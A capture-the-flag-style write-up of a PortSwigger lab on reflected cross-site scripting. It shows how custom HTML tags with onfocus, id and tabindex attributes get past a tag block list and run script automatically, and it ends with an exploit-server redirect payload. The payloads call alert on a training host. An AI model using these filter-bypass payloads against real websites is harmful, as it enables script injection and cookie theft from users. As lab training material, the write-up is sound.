# Lab: Reflected XSS into HTML context with all tags blocked except custom ones
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

```bash
# Search

<img src=0 onerror=alert()>

Result: "Tag is not allowed"
```
```bash
<custom-tag>

# You won't see the custom tag, but when you inspect the result inside the HTML code, you will find it.
# So, we can use <custom-tag>.
<custom-tag>'</custom-tag>
```

```bash
<custom-tag onmouseover=alert("a")>

# If you use this and move your mouse over the result, you will get an alert.

<custom-tag onmouseover=alert(document.cookie)>

# This doesn't solve the lab because it does not trigger an alert automatically.
```
```bash
<custom-tag onfocus=alert(document.cookie) id='a' tabindex='1'>

# web-security-academy.net/?search=<custom-tag+onfocus%3Dalert(document.cookie)+id%3D'a'+tabindex%3D'1'> add #a to our link.
# And now, we can see the automated attack.
```

```bash
# Go to exploit server
<script>
location='https://0ac300e4037ef235801a2663000300c3.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3Dalert(document.cookie)+id%3D%27a%27+tabindex%3D%271%27%3E#a' 
</script>

# You need to put it inside a <script> tag. The <script> tag is used to embed JavaScript code in HTML.
# onfocus=alert(document.cookie) means that when the element gains focus, it triggers an alert displaying the document's cookies.
# id='a' and tabindex='1' are additional attributes for the element.x
```
